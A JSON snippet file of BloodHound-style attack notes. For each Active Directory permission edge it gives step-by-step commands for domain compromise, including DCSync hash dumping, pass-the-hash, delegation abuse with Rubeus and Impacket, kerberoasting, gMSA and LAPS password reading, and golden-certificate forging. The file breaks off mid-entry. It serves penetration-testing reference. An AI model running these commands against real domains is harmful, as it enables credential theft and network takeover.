{
    "AddMember linux": {
        "description": "",
        "prefix": "AddMember",
        "body": [
            "Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:",
            "```bash",
            "net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```",
            "It can also be done with pass-the-hash using pth-toolkit's net tool. If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.",
            "```bash",
            "pth-net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\"",
            "```",
            "Finally, verify that the user was successfully added to the group:",
            "```bash",
            "net rpc group members \"TargetGroup\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```"
        ]
    },
    "ForceChangePassword linux": {
        "description": "",
        "prefix": "ForceChangePassword",
        "body": [
            "Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.",
            "```bash",
            "net rpc password \"TargetUser\" \"newP@ssword2022\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```",
            "It can also be done with pass-the-hash using pth-toolkit's net tool. If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.",
            "```bash",
            "pth-net rpc password \"TargetUser\" \"newP@ssword2022\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\"",
            "```",
            "Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."
        ]
    },
    "OwnsLimitedRights linux": {
        "description": "",
        "prefix": "OwnsLimitedRights",
        "body": [
            "To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted permissions, you can abuse the specific permissions granted to the OWNER RIGHTS SID.",
            "Please refer to the abuse info for the specific granted permissions at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"
        ]
    },
    "OwnsLimitedRights windows": {
        "description": "",
        "prefix": "OwnsLimitedRights",
        "body": [
            "To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted privileges, you can abuse the specific privileges granted to the OWNER RIGHTS SID.",
            "Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"
        ]
    },
    "WriteOwnerLimitedRights linux": {
        "description": "",
        "prefix": "WriteOwnerLimitedRights",
        "body": [
            "To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID in the context of the new owner.",
            "Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"
        ]
    },
    "WriteOwnerLimitedRights windows": {
        "description": "",
        "prefix": "WriteOwnerLimitedRights",
        "body": [
            "To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID in the context of the new owner.",
            "Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"
        ]
    },
    "AllowedToDelegate linux": {
        "description": "",
        "prefix": "AllowedToDelegate",
        "body": [
            "In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the \"HTTP/PRIMARY.testlab.local\" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the \"admin\" user to the \"HTTP/PRIMARY.testlab.local\" SPN. The alternative sname \"cifs\" is substituted in to the final service ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the \"admin\" user.",
            "```bash",
            "getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'",
            "```"
        ]
    },
    "AllowedToDelegate windows": {
        "description": "",
        "prefix": "AllowedToDelegate",
        "body": [
            "Abusing this privilege can utilize Benjamin Delpy's Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project's s4u abuse.",
            "In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the \"HTTP/PRIMARY.testlab.local\" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the \"admin\" user to the \"HTTP/PRIMARY.testlab.local\" SPN. The alternative sname \"cifs\" is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the \"admin\" user.",
            "```bash",
            "Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:\"HTTP/PRIMARY.testlab.local\" /altservice:cifs /ptt",
            "```"
        ]
    },
    "GetChanges linux": {
        "description": "",
        "prefix": "GetChanges",
        "body": [
            "You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:",
            "```bash",
            "secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "GetChanges windows": {
        "description": "",
        "prefix": "GetChanges",
        "body": [
            "With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:",
            "```bash",
            "lsadump::dcsync /domain:testlab.local /user:Administrator",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "GetChangesAll linux": {
        "description": "",
        "prefix": "GetChangesAll",
        "body": [
            "You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:",
            "```bash",
            "secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "GetChangesAll windows": {
        "description": "",
        "prefix": "GetChangesAll",
        "body": [
            "With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:",
            "```bash",
            "lsadump::dcsync /domain:testlab.local /user:Administrator",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "ReadLAPSPassword linux": {
        "description": "",
        "prefix": "ReadLAPSPassword",
        "body": [
            "Read the LAPS password attributes listed in the General section.",
            "Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:",
            "```bash",
            "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime",
            "```",
            "See Windows abuse for retrieving and decrypting the encrypted attributes."
        ]
    },
    "ReadLAPSPassword windows": {
        "description": "",
        "prefix": "ReadLAPSPassword",
        "body": [
            "Read the LAPS password attributes listed in the General section.",
            "Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:",
            "```bash",
            "Get-DomainComputer \"MachineName\" -Properties \"cn\",\"ms-mcs-admpwd\",\"ms-mcs-admpwdexpirationtime\"",
            "```",
            "Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:",
            "```bash",
            "Get-LapsADPassword \"WIN10\" -AsPlainText",
            "```",
            "The encrypted attributes can also be retrieved and decrypted using lapsv2decrypt (dotnet or BOF)."
        ]
    },
    "GPLink linux": {
        "description": "",
        "prefix": "GPLink",
        "body": [
            "With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse.",
            "pyGPOAbuse.py can be used for that purpose."
        ]
    },
    "GPLink windows": {
        "description": "",
        "prefix": "GPLink",
        "body": [
            "With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."
        ]
    },
    "AddAllowedToAct linux": {
        "description": "",
        "prefix": "AddAllowedToAct",
        "body": [
            "First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",
            "```bash",
            "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'",
            "```",
            "We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",
            "```bash",
            "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'",
            "```",
            "And finally we can get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose.",
            "```bash",
            "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'",
            "```",
            "This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."
        ]
    },
    "AddAllowedToAct windows": {
        "description": "",
        "prefix": "AddAllowedToAct",
        "body": [
            "Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:",
            "```bash",
            "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)",
            "```",
            "PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:",
            "```bash",
            "$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid",
            "```",
            "We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:",
            "```bash",
            "$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"",
            "$SDBytes = New-Object byte[] ($SD.BinaryLength)",
            "$SD.GetBinaryForm($SDBytes, 0)",
            "```",
            "Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:",
            "```bash",
            "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}",
            "```",
            "We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:",
            "```bash",
            "Rubeus.exe hash /password:Summer2018!",
            "```",
            "And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:",
            "```bash",
            "Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt",
            "```"
        ]
    },
    "AllowedToAct linux": {
        "description": "",
        "prefix": "AllowedToAct",
        "body": [
            "We can then get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose.",
            "```bash",
            "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'",
            "```",
            "This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."
        ]
    },
    "ReadGMSAPassword linux": {
        "description": "",
        "prefix": "ReadGMSAPassword",
        "body": [
            "There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process.",
            "If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the \"HasSession\" help modal for more details).",
            "Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.gMSADumper.py can be used for that purpose.",
            "```bash",
            "gMSADumper.py -u 'user' -p 'password' -d 'domain.local'",
            "```",
            "At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."
        ]
    },
    "ReadGMSAPassword windows": {
        "description": "",
        "prefix": "ReadGMSAPassword",
        "body": [
            "There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process.",
            "If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the \"HasSession\" help modal for more details).",
            "Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash, then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:",
            "Build GMSAPasswordReader.exe from its source: https://github.com/rvazarkar/GMSAPasswordReaderDrop GMSAPasswordReader.exe to disk. If using Cobalt Strike, load and run this binary using execute-assemblyUse GMSAPasswordReader.exe to retrieve the NT hash for the GMSA. You may have more than one NT hash come back, one for the \"old\" password and one for the \"current\" password. It is possible that either value is valid:",
            "```bash",
            "gmsapasswordreader.exe --accountname gmsa-jkohler",
            "```",
            "At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."
        ]
    },
    "WriteSPN linux": {
        "description": "",
        "prefix": "WriteSPN",
        "body": [
            "A targeted kerberoast attack can be performed using targetedKerberoast.py.",
            "```bash",
            "targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'",
            "```",
            "The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.",
            "The recovered hash can be cracked offline using the tool of your choice."
        ]
    },
    "AddSelf linux": {
        "description": "",
        "prefix": "AddSelf",
        "body": [
            "Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:",
            "```bash",
            "net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```",
            "It can also be done with pass-the-hash using pth-toolkit's net tool. If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.",
            "```bash",
            "pth-net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\"",
            "```",
            "Finally, verify that the user was successfully added to the group:",
            "```bash",
            "net rpc group members \"TargetGroup\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```"
        ]
    },
    "AddKeyCredentialLink linux": {
        "description": "",
        "prefix": "AddKeyCredentialLink",
        "body": [
            "To abuse this permission, use pyWhisker.",
            "```bash",
            "pywhisker.py -d \"domain.local\" -u \"controlledAccount\" -p \"somepassword\" --target \"targetAccount\" --action \"add\"",
            "```",
            "For other optional parameters, view the pyWhisker documentation."
        ]
    },
    "DCSync linux": {
        "description": "",
        "prefix": "DCSync",
        "body": [
            "You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:",
            "```bash",
            "secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "DCSync windows": {
        "description": "",
        "prefix": "DCSync",
        "body": [
            "You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:",
            "```bash",
            "lsadump::dcsync /domain:testlab.local /user:Administrator",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "WriteAccountRestrictions linux": {
        "description": "",
        "prefix": "WriteAccountRestrictions",
        "body": [
            "First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",
            "```bash",
            "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'",
            "```",
            "We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",
            "```bash",
            "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'",
            "```",
            "And finally we can get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose.",
            "```bash",
            "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'",
            "```",
            "This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."
        ]
    },
    "WriteAccountRestrictions windows": {
        "description": "",
        "prefix": "WriteAccountRestrictions",
        "body": [
            "Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:",
            "```bash",
            "\"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)\"",
            "```",
            "PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:",
            "```bash",
            "'$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'",
            "```",
            "We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:",
            "```bash",
            "'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\\n' + '$SDBytes = New-Object byte[] ($SD.BinaryLength)\\n' + '$SD.GetBinaryForm($SDBytes, 0)'",
            "```",
            "Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:",
            "```bash",
            "\"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\"",
            "```",
            "We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:",
            "```bash",
            "'Rubeus.exe hash /password:Summer2018!'",
            "```",
            "And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:",
            "```bash",
            "'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'",
            "```"
        ]
    },
    "WriteGPLink linux": {
        "description": "",
        "prefix": "WriteGPLink",
        "body": [
            "From a Linux machine, the WriteGPLink permission may be abused using the OUned.py exploitation tool. For a detailed outline of exploit requirements and implementation, you can refer to the article associated to the OUned.py tool.",
            "Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."
        ]
    },
    "WriteGPLink windows": {
        "description": "",
        "prefix": "WriteGPLink",
        "body": [
            "From a domain-joined compromised Windows machine, the WriteGPLink permission may be abused through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to this article.",
            "Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."
        ]
    },
    "Enroll linux": {
        "description": "",
        "prefix": "Enroll",
        "body": [
            "Certipy can be used to enroll a certificate:",
            "```bash",
            "certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
            "```",
            "The following requirements must be met for a principal to be able to enroll a certificate:",
            "1) The principal has enrollment rights on a certificate template",
            "2) The certificate template is published on an enterprise CA",
            "3) The principal has Enroll permission on the enterprise CA",
            "4) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"
        ]
    },
    "Enroll windows": {
        "description": "",
        "prefix": "Enroll",
        "body": [
            "Certify can be used to enroll a certificate:",
            "```bash",
            "Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE",
            "```",
            "The following requirements must be met for a principal to be able to enroll a certificate:",
            "1) The principal has enrollment rights on a certificate template",
            "2) The certificate template is published on an enterprise CA",
            "3) The principal has Enroll permission on the enterprise CA",
            "4) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"
        ]
    },
    "EnterpriseCAFor linux": {
        "description": "",
        "prefix": "EnterpriseCAFor",
        "body": [
            "An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "EnterpriseCAFor windows": {
        "description": "",
        "prefix": "EnterpriseCAFor",
        "body": [
            "An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "RootCAFor linux": {
        "description": "",
        "prefix": "RootCAFor",
        "body": [
            "An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other edges and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "RootCAFor windows": {
        "description": "",
        "prefix": "RootCAFor",
        "body": [
            "An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other edges and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "PublishedTo linux": {
        "description": "",
        "prefix": "PublishedTo",
        "body": [
            "An attacker may perform several attacks that rely on a template being published to a certification authority. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "PublishedTo windows": {
        "description": "",
        "prefix": "PublishedTo",
        "body": [
            "An attacker may perform several attacks that rely on a template being published to a certification authority. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "NTAuthStoreFor linux": {
        "description": "",
        "prefix": "NTAuthStoreFor",
        "body": [
            "An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "NTAuthStoreFor windows": {
        "description": "",
        "prefix": "NTAuthStoreFor",
        "body": [
            "An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "IssuedSignedBy linux": {
        "description": "",
        "prefix": "IssuedSignedBy",
        "body": [
            "An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "IssuedSignedBy windows": {
        "description": "",
        "prefix": "IssuedSignedBy",
        "body": [
            "An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "TrustedForNTAuth linux": {
        "description": "",
        "prefix": "TrustedForNTAuth",
        "body": [
            "An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "TrustedForNTAuth windows": {
        "description": "",
        "prefix": "TrustedForNTAuth",
        "body": [
            "An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "HostsCAService linux": {
        "description": "",
        "prefix": "HostsCAService",
        "body": [
            "An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to the domain node. Check if there is an outbound GoldenCert edge from the computer node."
        ]
    },
    "HostsCAService windows": {
        "description": "",
        "prefix": "HostsCAService",
        "body": [
            "An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to the domain node. Check if there is an outbound GoldenCert edge from the computer node."
        ]
    },
    "DelegatedEnrollmentAgent linux": {
        "description": "",
        "prefix": "DelegatedEnrollmentAgent",
        "body": [
            "An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "DelegatedEnrollmentAgent windows": {
        "description": "",
        "prefix": "DelegatedEnrollmentAgent",
        "body": [
            "An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "EnrollOnBehalfOf linux": {
        "description": "",
        "prefix": "EnrollOnBehalfOf",
        "body": [
            "An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "EnrollOnBehalfOf windows": {
        "description": "",
        "prefix": "EnrollOnBehalfOf",
        "body": [
            "An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "GoldenCert linux": {
        "description": "",
        "prefix": "GoldenCert",
        "body": [
            "1) Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host using Certipy:",
            "```bash",
            "certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'",
            "```",
            "The enterprise CA certificate is the one where issuer and subject are identical.",
            "2) Forge a certificate of a target principal:",
            "```bash",
            "certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'",
            "```",
            "3) Request a TGT for the targeted principal using the certificate against a given DC:",
            "```bash",
            "certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'",
            "```"
        ]
    },
    "GoldenCert windows": {
        "description": "",
        "prefix": "GoldenCert",
        "body": [
            "Obtain CA certificate incl. private key - using built-in GUI (certsrv.msc)",
            "1) Open certsrv.msc as Administrator on the enterprise CA host.",
            "2) Right-click on the enterprise CA and select \"All Tasks\" followed by \"Back up CA...\".",
            "3) Click \"Next\", select \"Private key and CA certificate\", and select the location folder.",
            "4) Click \"Next\", and set a password.",
            "5) Click \"Next\" and click \"Finish\" to back up the certificate as a .p12 file.",
            "Obtain CA certificate incl. private key - using commandline tools",
            "1) Print all certificates of the host using SharpDPAPI:```bash",
            "SharpDPAPI.exe certificates /machine",
            "```The enterprise CA certificate is the one where issuer and subject are identical.",
            "2) Save the private key in .key file (e.g. cert.key) and the certificate in .pem file (cert.pem) in the same folder.",
            "3) Create a .pfx version of the CA certificate using certutil:```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "4) Set password when prompted.",
            "Forge certificate and obtain a TGT as targeted principal",
            "1) Forge a certificate of a target principal using ForgeCert:```bash",
            "ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword \"password123!\" --Subject \"CN=User\" --SubjectAltName \"roshi@dumpster.fire\" --NewCertPath target.pfx --NewCertPassword \"NewPassword123!\"",
            "```",
            "2) Request a TGT for the targeted principal using the certificate with Rubeus:```bash",
            "Rubeus.exe asktgt /user:Roshi /domain:dumpster.fire /certificate:target.pfx /password:NewPassword123!",
            "```"
        ]
    },
    "ADCSESC1 linux": {
        "description": "",
        "prefix": "ADCSESC1",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:",
            "```bash",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local",
            "```",
            "- Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```bash",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ADCSESC1 windows": {
        "description": "",
        "prefix": "ADCSESC1",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certify to request enrollment in the affected template, specifying the affected certification authority and target principal to impersonate:",
            "```bash",
            "Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC1\" /altname:forestrootda /sidextension:S-1-5-21-2697957641-2271029196-387917394-500",
            "```",
            "Save the certificate as cert.pem and the private key as cert.key.",
